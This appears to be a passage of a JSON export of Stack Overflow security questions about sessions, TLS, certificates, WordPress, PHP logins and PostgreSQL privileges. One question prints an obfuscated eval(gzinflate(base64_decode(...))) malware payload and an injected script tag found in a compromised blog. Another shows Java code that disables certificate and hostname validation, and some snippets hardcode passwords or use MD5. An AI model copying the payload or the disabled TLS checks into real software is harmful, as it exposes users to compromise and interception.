also, the css and other media are loaded from the same subdomain, but this does not affect the page, so long as the script did not load them [o_0].</p>\n\n<p>i want to keep all of my resources on a separate subdomain for scalability, so, this issue is frustrating, because i don't quite understand why it's still happening...</p>\n"},{"tags":["php","security","session"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":115,"score":0,"question_id":8138213,"title":"fail to use session in php","body":"<p>I read a bit on how to secure a session and what I decided to do was to save the session_id to the database, and then save it to a session variable after it has been encrypted.</p>\n\n<p>Here is the class that I used for the encryption (it was writen by Orielly books author):</p>\n\n<p><a href=\"https://github.com/ezimuel/PHP-Secure-Session/blob/master/SecureSession.php\" rel=\"nofollow\">Encrypted class using session_set_save_handler</a></p>\n\n<p>The I apply it this way:</p>\n\n<pre><code>ini_set('session.use_only_cookies',true);       \n\n//calls the session class.  \n require_once(dirname(__file__).\"/../../Administrator/secure_session.php\");\n             session_start();\n\n            if( !isset($_SESSION['mod']) )          \n            {   \n                Moderator::insert_moderator($name,session_id());    \n\n                $_SESSION['mod']= session_id();\n\n                $_SESSION['time']=time();\n\n                echo \"&lt;br/&gt;Moderator session: \".$_SESSION['mod'];\n            }\n</code></pre>\n\n<p>This is the exception which is being thrown:</p>\n\n<blockquote>\n  <p>Fatal error: Uncaught exception 'Exception' with message 'I cannot generate a secure pseudo-random key. Please use PHP >= 5.3 or Mcrypt extension' in C:\\xampp\\htdocs\\PoliticalForum\\Administrator\\secure_session.php:74 Stack trace: #0 C:\\xampp\\htdocs\\PoliticalForum\\Administrator\\secure_session.php(107): SecureSession->_randomKey(32) #1 [internal function]: SecureSession->open('C:\\xampp\\htdocs...', 'PHPSESSID') #2 C:\\xampp\\htdocs\\PoliticalForum\\StoredProcedure\\User\\headerSite.php(43): session_start() #3 C:\\xampp\\htdocs\\PoliticalForum\\mainHome.php(14): include_once('C:\\xampp\\htdocs...') #4 {main} thrown in C:\\xampp\\htdocs\\PoliticalForum\\Administrator\\secure_session.php on line 74</p>\n</blockquote>\n\n<p>What am I doing wrong, how can I fix this, cause I dont understand much of encryption!</p>\n"},{"tags":["java","security","google-app-engine","pdf"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":29,"score":-2,"question_id":13108148,"title":"File transfer from 3rd party site to client through GAE/J","body":"<p>Now i have a site say X.com which has a few images &amp; a pdf.</p>\n\n<p>I want users to be able to download / see them on browser but not directly but from my GAE website.</p>\n\n<p>Can i use URL Fetch service for this?</p>\n\n<p>How do i download file from an URL of X to GAE server and then pass that data as part of response to client request?\nWill this be a very expensive operation?</p>\n\n<p>If i do this can i close access to server hosting site X.com to only accept request from GAE?\nHow do i do the IP settings to achieve this?</p>\n\n<p>What other security can be put on X so data isn't directly accessible?</p>\n"},{"tags":["php","iphone","xcode","security","privatekey"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":12343257,"title":"Decrypt data Xcode to PHP","body":"<p>I'm making an application with Xcode which encrypts information using the private key of a certificate, this information is sent to a server using a POST in PHP (Eg: username = \"encrypted data\") and I want to decrypt this information in the PHP with the private key and get the real information, I encrypted the information with SecKeyEncrypt in Xcode and then sent to PHP, but how I can decrypt it with the private key in php?</p>\n"},{"tags":["security","jmx"],"answer_count":0,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":365,"score":1,"question_id":491637,"title":"JMX htmladapter user security","body":"<p>Is it possible to have user based security permissions for JMX on a JMX generated webpage? If so, how?</p>\n\n<p>We're currently using a HtmlAdaptorServer class to provide a web front end. The problem comes where this JMX site is becoming very big and we want to allow some mbeans on a server for everyone and restrict more risky mbeans to certain users.</p>\n\n<p>The java policy authentication in the ConnectorServer classes is what I'd like to aim for, but I don't know how to link these with the htmladaptor.</p>\n"},{"tags":["security","wmi","remote-access","dcom"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":686,"score":2,"question_id":3678190,"title":"Querying remote system via WMI returns access denied for non-administrator","body":"<p>I have a simple WMI query that runs fine locally, but querying a remote system gives an access denied error. When I add the local user to the remote system as member of the administrator group, the query works as expected, but I don't want to have that user as a member of that group.</p>\n\n<p>I already tried the following things, unfortunately not successful so far:</p>\n\n<ul>\n<li>I enabled RemoteAdmin for the firewall (netsh firewall set service RemoteAdmin enable)</li>\n<li>I added the user with all possible access rights to the WMI Security settings (for the root name space, and I also checked that the settings are correctly propagated to the namespace I'm querying, root/cimv2) via wmimgmt.msc</li>\n<li>I enabled remote access for the user in DCOM COM security</li>\n</ul>\n\n<p>I still get the same error every time I run my query, is there anything else that I may have missed?</p>\n"},{"tags":["security","pdf"],"answer_count":7,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":3222,"score":3,"question_id":4930914,"title":"Prevent PDF file from downloading and printing","body":"<p>I am trying to find a way to prevent a PDF from being printed or downloaded when view from web.  Also, it is prefered that user cannot print screen.</p>\n\n<p>I am thinking about converting those PDF files to Flash.  Any other ideas?</p>\n"},{"tags":["java","security","applet","signing"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":41,"score":1,"question_id":13088569,"title":"How to use a provided keystore to sign a jar file","body":"<p>My client gave me a keystore for the purpose of signing a Java applet jar file. I exported a .cer file from it and then imported it into cacerts but I keep getting \"Certificate chain not found\" error. It also says \"alias must reference a valid KeyStore key entry containing a private key and corresponsing public key certificate chain.\"</p>\n\n<p>I tried Gaston's suggestion below, it went as follows:</p>\n\n<pre><code>jarsigner -keystore \"D:\\My Documents\\keystore\\MyKeyStore.jks\" -storepass mypass -signedjar my_signed_jar.jar\" unsigned.jar myalias\n\nWarning:\nThe signer's certificate chain is not validated.\n</code></pre>\n"},{"tags":["php","linux","security","optimization","shell-exec"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":57,"score":1,"question_id":13104396,"title":"PHP shell_exec() - Run directly, or perform a cron (bash/php) and include MySQL layer?","body":"<p>Sorry if the title is vague - I wasn't quite sure how to word it!</p>\n\n<p><strong>What I'm Doing</strong></p>\n\n<p>I'm running a Linux command to output data into a variable, parse the data, and output it as an array. Array values will be displayed on a page using PHP, and this PHP page output is requested via AJAX every 10 seconds so, in effect, the data will be retrieved and displayed/updated every 10 seconds. There could be as many as 10,000 characters being parsed on every request, although this is usually much lower.</p>\n\n<p><strong>Alternative Idea</strong></p>\n\n<p>I want to know if there is a better* alternative method of retrieving this data every 10 seconds, as multiple users (&lt;10) will be having this command executed automatically for them.</p>\n\n<p>A cronjob running on the server could execute either bash or php (which is faster?) to grab the data and store it in a MySQL database. Then, any AJAX calls to the PHP output would return values in the MySQL database rather than making a direct call to execute server code every 10 seconds.</p>\n\n<p><strong>Why?</strong></p>\n\n<p>I know there are security concerns with running execs directly from PHP, and (I hope this isn't micro-optimisation) I'm worried about CPU usage on the server. The server is running a <em>sempron</em> processor. Yes, they do still exist.</p>\n\n<p>Having this only execute when the user is on the page (idea #1) means that the server isn't running code that doesn't need to be run. However, is this slow and insecure?</p>\n\n<p>Just in case the type of linux command may be of assistance in determining it's efficiency:</p>\n\n<p><code>shell_exec(\"transmission-remote $host:$port --auth $username:$password -l\");</code></p>\n\n<p>I'm hoping that there are differences in efficiency and level of security with the two methods I have outlined above, and that this <em>isn't</em> just micro-micro-optimisation. If there are alternative methods that are better*, I'd love to learn about these! :)</p>\n"},{"tags":["php","html","security","http","https"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":13103707,"title":"Converting to HTTPS","body":"<p>I have an https site and google displays the lock with the yellow triangle on top meaning:</p>\n\n<blockquote>\n  <p>The site uses SSL, but Google Chrome has detected insecure content on\n  the page.  Be careful if youre entering sensitive information on this\n  page.  Insecure content can provide a loophole for someone to change\n  the look of the page.</p>\n</blockquote>\n\n<p>I want to change my site so it is completely secure and I get the green lock. However when I try to access my page through https like so <code>https://www.domain.com</code> rather than <code>http://www.domain.com</code>, most things don't work. Chrome's inspector says stuff like:</p>\n\n<blockquote>\n  <p>The page at <a href=\"https://www.domain.com/Folder/\" rel=\"nofollow\">https://www.domain.com/Folder/</a> displayed insecure content\n  from <a href=\"http://website.com/media/images/photo.jpg\" rel=\"nofollow\">http://website.com/media/images/photo.jpg</a>.</p>\n</blockquote>\n\n<p>Is that just because the page I'm getting my photos from is http? What are the steps I should take to start converting my entire site to https (in terms of changing code)?</p>\n"},{"tags":["xcode","osx","security","rsa","key-pair"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":77,"score":0,"question_id":12800119,"title":"Objective C Secure.h RSA key-pair generating","body":"<p>I tried to ask a follow-up question on <a href=\"http://stackoverflow.com/questions/10222524/rsa-implementations-in-objective-c\">this topic</a> with example code on how to generate rsa-keys which did not work for me, but it got deleted by moderator for some reason. So I'm going to try agin with posting a new question.</p>\n\n<p>My problem with that answer is that Xcode tells me that \"kSecPrivateKeyAttrs\" and \"kSecPublicKeyAttrs\" identifiers is not declared. These identifiers are mentioned in apple developer docs, but they does not seem to exist in Secure framework. </p>\n\n<p>I'm using Xcode 4.5 and OS X SDK 10.8.</p>\n\n<p>appreciate any help i can get, I'm fairly new att OC-programming.\nIf i get this to work, I Would also like to know how to get pubkey and privkey as NSString or NSData. </p>\n\n<p>Thank you</p>\n\n<p>EDIT: I still have problems with this, surely there's someone else out there with the same problem that have fixed it and can point me in the right direction?</p>\n\n<p>EDIT2 As I Said, i was trying out the code from the link i posted, but here is the full code anyways:</p>\n\n<p>Keypair.h</p>\n\n<pre><code>#import &lt;Security/Security.h&gt;\n\n@interface Keypair\n{\n    SecKeyRef publicKey;\n    SecKeyRef privateKey;\n    NSData *publicTag;\n    NSData *privateTag;\n }\n - (void)generateKeyPair:(NSUInteger)keySize;\n @end\n</code></pre>\n\n<p>Keypair.m</p>\n\n<pre><code>#import \"Keypair.h\"\n\n@implementation Keypair\n\nstatic const UInt8 publicKeyIdentifier[] = \"com.XXXXXXX.publickey\\0\";\nstatic const UInt8 privateKeyIdentifier[] = \"com.XXXXXXX.privatekey\\0\";\n\n+ (void)generateKeyPair:(NSUInteger)keySize {\n    OSStatus sanityCheck = noErr;\n    SecKeyRef publicKey = NULL;\n    SecKeyRef privateKey = NULL;\n    NSData *publicTag;\n    NSData *privateTag;\n\n    // Container dictionaries.\n    NSMutableDictionary * privateKeyAttr = [[NSMutableDictionary alloc] init];\n    NSMutableDictionary * publicKeyAttr = [[NSMutableDictionary alloc] init];\n    NSMutableDictionary * keyPairAttr = [[NSMutableDictionary alloc] init];\n\n    // Set top level dictionary for the keypair.\n    [keyPairAttr setObject:(__bridge id)kSecAttrKeyTypeRSA forKey:(__bridge id)kSecAttrKeyType];\n    [keyPairAttr setObject:[NSNumber numberWithUnsignedInteger:keySize] forKey:(__bridge id)kSecAttrKeySizeInBits];\n    [keyPairAttr setObject:[NSNumber numberWithBool:YES] forKey:(__bridge id)kSecAttrIsPermanent];\n\n    // Set the private key dictionary.\n    [privateKeyAttr setObject:[NSNumber numberWithBool:YES] forKey:(__bridge id)kSecAttrIsPermanent];\n    [privateKeyAttr setObject:privateTag forKey:(__bridge id)kSecAttrApplicationTag];\n    // See SecKey.h to set other flag values.\n\n    // Set the public key dictionary.\n    [publicKeyAttr setObject:[NSNumber numberWithBool:YES] forKey:(__bridge id)kSecAttrIsPermanent];\n    [publicKeyAttr setObject:publicTag forKey:(__bridge id)kSecAttrApplicationTag];\n    // See SecKey.h to set other flag values.\n\n    // Set attributes to top level dictionary.\n    [keyPairAttr setObject:privateKeyAttr forKey:(id)kSecPrivateKeyAttrs];\n    [keyPairAttr setObject:publicKeyAttr forKey:(id)kSecPublicKeyAttrs];\n\n\n    // SecKeyGeneratePair returns the SecKeyRefs just for educational purposes.\n    sanityCheck = SecKeyGeneratePair((__bridge CFDictionaryRef)keyPairAttr, &amp;publicKey, &amp;privateKey);\n    if(sanityCheck == noErr  &amp;&amp; publicKey != NULL &amp;&amp; privateKey != NULL)\n    {\n        NSLog(@\"Successful\");\n    }\n}\n\n@end\n</code></pre>\n"},{"tags":["security","iis7","certificates","x509certificate"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":9760,"score":2,"question_id":1503840,"title":"Convert certificate .pem to .der/.cer","body":"<p>I'm trying convert .pem to .cer using OpenSSL...</p>\n\n<pre><code>openssl x509 -inform PEM -in root.pem -outform DER -out root.cer\n</code></pre>\n\n<p>But, I don't know how to install the certificate on IIS 7.0 over Win Server 2008.</p>\n\n<p>I read some tutorials about it and tried to install the cert in IIS 7.0</p>\n\n<blockquote>\n  <p>Server Certificates -> complete certificate request -> </p>\n</blockquote>\n\n<p>The following error appears</p>\n\n<blockquote>\n  <p>Cannot find the certificate request associated with this certificate file. A certificate request must be completed on the computer where it was created.</p>\n</blockquote>\n\n<p>The installation of the certificate to IIS fails.</p>\n\n<p>Any suggestions on how to proceed installing the .cer in IIS 7?</p>\n"},{"tags":["php","html","security","login","code-injection"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":37,"score":1,"question_id":13102543,"title":"PHP Account Security","body":"<p>Currently I have a site that hides the account window where you can change password, upload files, etc. The code is simple as:<br></p>\n\n<pre><code>&lt;?php if($is_logged_in) { ?&gt;\n      &lt;div id=\"account_window\"&gt;\n          //stuff\n      &lt;/div&gt;\n&lt;?php } ?&gt;\n</code></pre>\n\n<p>But according to <a href=\"http://stackoverflow.com/questions/13095387/php-admin-account\">this</a> that's a big security flaw. So what is the alternative? How can I make the account window viewable only if the user has logged in and do it in a more secure manner that is not susceptible <code>if someone just injects the right HTML into the page</code>?</p>\n"},{"tags":["javascript","security","closures"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":50,"score":2,"question_id":13101968,"title":"Private variables and closures","body":"<p>As <em>Douglas Crockford</em> says we can have private properties using closures in JavaScript and they are very handy to handle secure data. </p>\n\n<p>Now I understand the concept of Encapsulation, as it helps us to manage and structure the code . Even private variables are useful for performance, eg: you can cache DOM elements, properties and global variables for iterative access. </p>\n\n<p>So the question is: <strong>How exactly closures or private variables help us in handling the sensitive data?</strong> </p>\n"},{"tags":["java","android","security","proguard"],"answer_count":3,"favorite_count":2,"up_vote_count":6,"down_vote_count":0,"view_count":75,"score":6,"question_id":13101727,"title":"Obfuscation: hide hardcoded values in java","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/4427238/hiding-strings-in-obfuscated-code\">hiding strings in Obfuscated code</a>  </p>\n</blockquote>\n\n\n\n<p>I'm trying to hide a little some static Strings of my app in order to make it harder to decompile, this way like the constants like cipher algorithms names are harder to find in the obfuscated code.</p>\n\n<p>I've considered things like:</p>\n\n<pre><code>String CONCAT= \"concat\"+\"string\";\nString RAW_STRING= \"raw_string\";\nString FROM_BYTES=new String(\"from_bytes\".getBytes());\nString FROM_CHARS=new String(new char[]{'f','r','o','m','_','c','h','a','r','s'});\nString FROM_CHAR2=new String(new char[]{102,114,111,109,95,99,104,97,114,115,95,50});\n</code></pre>\n\n<p>And the last two options seems to be \"darker\" than the  raw option but I imagine there are better ways for doing this.</p>\n\n<p>How can I improve this? Thanks </p>\n"},{"tags":["php","mysql","security"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":34,"score":1,"question_id":13101675,"title":"php and mysql login script error","body":"<p>I've made a php login script and it just not works.</p>\n\n<p>my code :</p>\n\n<pre><code>&lt;?php\n\nfunction clean($str) { /* sanatize strings for databases &amp; security */\n  $str = trim($str);\n    if(get_magic_quotes_gpc()) {\n        $str = stripslashes($str);\n    }\n    return mysql_real_escape_string($str);\n}\n\nif (!empty($_POST['login_admin'])) {\n\n    $username = clean($_POST['name']);\n    $password = clean($_POST['password']);\n\n      try {\n        $dbh = new PDO('mysql:host=localhost;dbname=imedia', \"imedia\", \"imedia\");\n\n        $statement = $dbh-&gt;prepare(\"SELECT * FROM administratori WHERE username =:username AND parola =:password\");\n        $statement-&gt;execute(array(\":username\" =&gt; $username, \":password\" =&gt; md5($password)));\n        $row = $statement-&gt;fetch();\n        if ($row) {\n            session_start(\"imedia_admin\");\n            $_SESSION['imedia_admin']['logname'] = $row['username'];\n            $_SESSION['imedia_admin']['password'] = $row['password'];\n            echo json_encode(\"success\");\n        } else {\n            echo json_encode(\"error\");\n        }\n\n        $dbh = null;\n    } catch (PDOException $e) {\n        print \"Error!: \" . $e-&gt;getMessage() . \"&lt;br/&gt;\";\n        die();\n    }\n}\n?&gt;\n</code></pre>\n\n<p>problem is in <code>clean</code> function, if a do not use it, my code works, can anybody explain me what i am doing wrong please ?</p>\n"},{"tags":["php","security","smtp","gmail","pear"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":37,"score":1,"question_id":13101072,"title":"Is sending from gmail via pear secure?","body":"<p>I'm using a form on my website to send an email using the PEAR mail function. The email will send via gmail as described here - <a href=\"http://www.phpmaniac.net/wiki/index.php/Pear_Mail\" rel=\"nofollow\">http://www.phpmaniac.net/wiki/index.php/Pear_Mail</a></p>\n\n<p>I will therefore need to include something like the:</p>\n\n<pre><code>&lt;?php\n$smtp_params[\"host\"]     = \"smtp.gmail.com\";\n$smtp_params[\"port\"]     = \"25\";\n$smtp_params[\"auth\"]     = true;\n$smtp_params[\"username\"] = \"user@gmail.com\";\n$smtp_params[\"password\"] = \"pass\";\n?&gt;\n</code></pre>\n\n<p>Is it secure to put my username and password in the script like that? Obviously you wouldn't be able to see server-side script like this using 'View Source', but could you grab the source files via a web clipper or something and read the script that way? Thanks</p>\n"},{"tags":["security","webserver","lockfile"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":13098680,"title":"Ensuring security of my files at web server","body":"<p>I have hosted my website on a shared web-hosting server. However, I am worried about the security of the files that I have kept on the server. Admins of web-hosting service keep on changing the contents of my cron jobs etc. by their own. I am worried if they change my files also some day.</p>\n\n<p>Is there any way to lock my folders on web-server so that no one else can have access to it as we have folder-locker in Windows.</p>\n\n<p>Any other suggestions are also welcomed in this regard.</p>\n\n<p>Thanks !</p>\n"},{"tags":["php","security","upload","system","picture"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":50,"score":2,"question_id":13098321,"title":"How to Secure php picture upload system","body":"<p>I want to make picture upload system with php and i want users will be able to upload just \npng,jpg files and not viruses or other files. how can i do this?</p>\n"},{"tags":["html","database","security"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":13098517,"title":"Is it good to place Database values inside hidden elements for later use in HTML","body":"<p>I'm using an approach but I don't know if it's wrong.</p>\n\n<p>When I connect to the database in my website, the ResultSet will return the \"Username\" and the \"UserId\".</p>\n\n<pre><code>while(rset.next()) {\n//I place the Username inside a DIV, which is visible\n//I Place the UserId inside another Div, which is not visible\n}\n</code></pre>\n\n<p>I place the UserId because I need to grab them later for jquery and Ajax requests, when I view the source code, those UserIds are visible in the source code.</p>\n\n<p>Means anyone can know the id of the listed users, or any other thing that has an id, does this weaken the website's security? </p>\n"},{"tags":["security","windows-8","microsoft-metro"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":43,"score":-2,"question_id":13097590,"title":"Windows 8 - Prevent from remembering password in Email app","body":"<p>I've just upgraded from Windows 7 to Windows 8, so far so good.</p>\n\n<p>I've just added my email accounts and so will do the other members of my family.</p>\n\n<p>Is there a way to prevent remembering the username/password so when we open the metro Email app it prompts for username and password each time ?</p>\n\n<p>We used to use only one user account on windows 7 and I don't want to create additional accounts just for the sake of each member checking his own emails in his session (this is the only solution I've seen so far).</p>\n\n<p>Thanks !</p>\n\n<p>Charles</p>\n"},{"tags":["php","apache","security","http","authentication"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":32,"score":1,"question_id":13097214,"title":"PHP + Apache Basic HTTP authentication/limit users to specific directories","body":"<p>I'd like to have logged in users access to certain directories only. For example, have the following directory structure:</p>\n\n<blockquote>\n  <p>/stuff/user-a/pic.jpg</p>\n  \n  <p>/stuff/user-b/file.doc</p>\n</blockquote>\n\n<p>I'd like Apache to only give user-a access to <code>/stuff/user-a</code> and give a 403 if he tries to reach <code>/stuff/user-b</code></p>\n\n<p>Now, I've been reading and it seems to be possible to do this with REMOTE_USER and mod_rewrite. Which will make it even better, as i could rewrite it as <code>/stuff -&gt; /stuff/$REMOTE_USER</code></p>\n\n<p>The problem is, I don't want the ugly browser popup. My PHP application already has a login form and a session. From what I've been reading, it is possible to use basic HTTP authentication as an auth method for PHP (to login as <a href=\"http://user:pass@stackoverflow.com\" rel=\"nofollow\">http://user:pass@stackoverflow.com</a>). But the opposite (passing a web form to the HTTP authentication) doesn't seem to be possible. </p>\n\n<p>I would also like to avoid using something as mod_xsendfile, as I'd rather not use any \"proxy\" scripts to handle this, and let Apache take care of access.</p>\n"},{"tags":["java","security","https"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":42,"score":1,"question_id":13076511,"title":"Security risks in disabling SSL certification for Java program","body":"<p>Our team crawls websites to keep our info up to date. I was running into <a href=\"http://stackoverflow.com/questions/13073285/response-failing-over-https-in-java/13073621#13073621\">security exceptions when crawling HTTPS pages</a>. The issue was that Java had an issue accepting self signed certificates from pages.</p>\n\n<p>Rather than keeping a list of certificates to accept (which could be difficult to maintain in the future), I'm using the work around provided by neu242 to <a href=\"http://stackoverflow.com/questions/875467/java-client-certificates-over-https-ssl\">disable SSL certification validation</a>.</p>\n\n<pre><code>public static void disableCertificateValidation() \n{\n    // Create a trust manager that does not validate certificate chains\n      TrustManager[] trustAllCerts = new TrustManager[] { \n        new X509TrustManager() {\n          public X509Certificate[] getAcceptedIssuers() { \n            return new X509Certificate[0]; \n          }\n\n\n        @Override\n        public void checkClientTrusted(X509Certificate[] arg0, String arg1) throws CertificateException\n        {\n            // TODO Auto-generated method stub\n\n        }\n        @Override\n        public void checkServerTrusted(X509Certificate[] arg0, String arg1) throws CertificateException\n        {\n            // TODO Auto-generated method stub\n\n        }\n      }};\n\n      // Ignore differences between given hostname and certificate hostname\n      HostnameVerifier hv = new HostnameVerifier() {\n\n        @Override\n        public boolean verify(String arg0, SSLSession arg1)\n        {\n            // TODO Auto-generated method stub\n            return true;\n        }\n      };\n\n      // Install the all-trusting trust manager\n      try {\n        SSLContext sc = SSLContext.getInstance(\"SSL\");\n        sc.init(null, trustAllCerts, new SecureRandom());\n        HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());\n        HttpsURLConnection.setDefaultHostnameVerifier(hv);\n      } catch (Exception e) {}\n}\n</code></pre>\n\n<p>Of course, this is posing a significant security risk. However, if I'm only using this code with my downloading program (the program which downloads images and pdf docs), and I'm not using the program to send any sensitive information, what security risks exist? From what I understand, this trust manager will be set only for the running JVM (the server running the program won't disable cert validation at the OS level). Further, if my requests for the images and docs were intercepted, my code will try to form the response into an image or pdf, respectively, and won't launch any malicious software. Is there a security risk I'm missing somewhere?</p>\n"},{"tags":["javascript","html","database","security","privacy"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":16,"score":2,"question_id":13082526,"title":"How to pass table record identifier to client side","body":"<p>In a CRUD environment, let say we are displaying list of user's contacts. Web site needs to provide \"Edit\" and \"Delete\" functionality to user. Each contact represents a record in database table, and identifier of a record must be passed to browser (client).</p>\n\n<p>In my applications, I normally have an auto increment identifier field in table and I pass its value to browser. So when user wants to edit or delete, I send request to server together with that identifier. In that way I can find the record in table.</p>\n\n<p>But I am worried about security and privacy. Normally I do not allow any other user to access someone else's record (Duh), though still do not like passing just an integer number to browser.</p>\n\n<p>AFAIK, big companies are providing a long unique identifier like 40F0C923BACECBF40C4CAA465D0E4DB0 to do this, but this time I will need to check if that value is used before every time I create a new record.</p>\n\n<p>I didn't know where to ask this question to Database section or here, and just asked here.\nHow do you guys manage to do this? or in other words, how it is done professionally?</p>\n"},{"tags":["php","security","cookies"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":3,"view_count":40,"score":-1,"question_id":13092186,"title":"How to make a login system like that of facebook","body":"<p>I have a enquiry, now this was a serious brainstorming problem for me. Do one thing at first, go to m.facebook.com from your phone, then login, then login from a computer and change the password from that computer, while changing the password, you are asked weather or not to deauthenticate the device that you are previously logged in with. if you choose keep them logged in, then again open fb from phone, then you don't need to login again, now the question is HOW? Because if fb don't store the hashed password in the cookie, then what does it store and yet it is secured? Anyone know about this login authentication system?</p>\n"},{"tags":["wordpress","security","virus"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":25,"score":1,"question_id":13093482,"title":"A link to a linkstoads.net in my wordpress blog, probably a virus. How do i get rid of it?","body":"<p>Recently (last 2 weeks) this line of code appeared in the footer of a wordpress blog :</p>\n\n<pre><code>&lt;script type=\"text/javascript\" src=\"http://linkstoads.net/keller/link.php?id=3\" name=\"linkstats\"&gt;&lt;/script&gt;\n</code></pre>\n\n<p>I did not put that here. I have no idea about what it does ; but I want it out.</p>\n\n<p>For my first try, I just replaced the template and it was gone for a few minutes. But it came back.</p>\n\n<p>So i got to my index.php file (not the template, the very first index.php) and found that code :</p>\n\n<pre><code>#c3284d#\neval(gzinflate(base64_decode(\"JcxLDoMwDEXROVL3EHkBeMCsfLqRTKxgKYE0WLFVtbsvkOnRe5dDPBxMGmoSc/YTnj0Yfw03+lBjD05rOD2ayRMxp7KrHbRqX9hw55y53tpLlFda5+G8FHpfrTYmUw/LhC24wPjo/g==\")));\n#/c3284d#\n</code></pre>\n\n<p>So I removed it, but it came back again the next day.</p>\n\n<p>How is that possible ? I'm a newbie about viruses and security, so the answer may be really basic.</p>\n"},{"tags":["security","testing"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":83,"score":1,"question_id":7936222,"title":"WebInspect on Production Systems","body":"<p>I have a client who has been using WebInspect on live production systems with live data.  They give the tool a real life user id with real life data, and let WebInspect have at it with full bore form filling.  In at least one case they have damaged production data as a result.  My client is adamant that they have to do this to insure that their website is secure.  To me this seems like an ill-conceived idea.  What are other people's opinions of this?  I've always thought of WebInspect as a developer's tool not a penetration testing tool.</p>\n"},{"tags":["javascript","security","pubnub"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12932427,"title":"Secure PUBNUB doesnt fire callback","body":"<p>pubnub = PUBNUB.secure({</p>\n\n<pre><code>     subscribe_key : \"#{config.subscribe_key}\",\n     publish_key   : \"#{config.publish_key}\",\n     origin        : 'pubsub.pubnub.com',\n     ssl           : true,\n     cipher_key    : \"#{config.publish_key}\"\n  });\n</code></pre>\n\n<p>pubnub.subscribe({</p>\n\n<pre><code>    restore  : true,\n    channel  : 'broadcast',\n    callback : function(data) {\n      debugger;\n      new_message_notification(data);\n    }\n  });\n</code></pre>\n\n<p>Callback is not working, but I see responses in NETWORK tab in browser.\nWhere is the problem?</p>\n"},{"tags":["java","android","security"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":29,"score":1,"question_id":13093817,"title":"Secure database storage in Android","body":"<p>I'm implementing the in-app-billing system for my app and (as the documentation advices) I'd like to add some encryption system to the database.</p>\n\n<p>I've tested <a href=\"https://guardianproject.info/code/sqlcipher/\" rel=\"nofollow\">SQLCipher</a>, I liked it but since it need to override all the classes at <code>android.database.sqlite.*</code> your app loses the connection to that part of the SDK, losing possible important future updates and depending on the developer (or yourself since is opensource).</p>\n\n<p>Other solution I've considered is to add a extra column in the <code>sensible</code> tables storing there a value (unique for each device), and then ignore the data that don't contain that key. But this method is clearly more weak.</p>\n\n<p>How can I improve the security without using SQLCipher? Thanks</p>\n"},{"tags":["security","salesforce","cloud","crm"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":34,"score":1,"question_id":12822924,"title":"salesforce - report permission issue data missing","body":"<p>Depending on the user, report data is missing when viewed via the dashboard. </p>\n\n<p>-In security settings I gave organization-wide read/write permission.<br>\n-The reports are based on a two custom data objects with a master/child relationship (which is also set as read/write.) </p>\n\n<p>-The report folder is also set as \"read/write\" and all users have permission.</p>\n\n<p>Anything else that I forgot to check?</p>\n\n<p>Thanks!</p>\n"},{"tags":["security","postgresql"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":13087084,"title":"insecure defaults with postgres public schema?","body":"<p>the question comes basically down to this: how can i securely create new databases on postgres, meaning that by default nobody has any privileges on new databases and all access must be explicitly defined.</p>\n\n<p>i tried various resources in the internet but can not get a clear answer. i tried this on fedora 17 linux with postgres 9.1, but eventually would use it on redhat 6.3 with postgres 8.4.</p>\n\n<p>the process:</p>\n\n<ol>\n<li>install postgres, run initdb, start server</li>\n<li>connect locally with postgres super user</li>\n<li>create new user u1 with options createdb and createrole</li>\n<li>disconnect and reconnect as u1</li>\n<li>create database db1</li>\n<li>create user u2</li>\n<li>disconnect and reconnect as u2</li>\n<li>create table t1 in db1</li>\n</ol>\n\n<p>i would not expect that last step to succeed. u2 has not been given any privileges on db1 and also no privileges show up when querying the database or schema. to my understanding u2 can create tables on db1, because of the public schema and the default privileges for the build-in public role. if i want to revoke them i can only do so on the database but not on the schema, because that is owned by postgres. so eventually i have to revoke those privileges with a super user for every new database i make. i can not delegate it to the owner of the database and also i must not forget to do it for every new database.</p>\n\n<p>the default would allow every user to spam the public schema in any new database. this is dangerous because other users may by default work on the public schema and not check that tables are already there and just use the existing ones owned by some 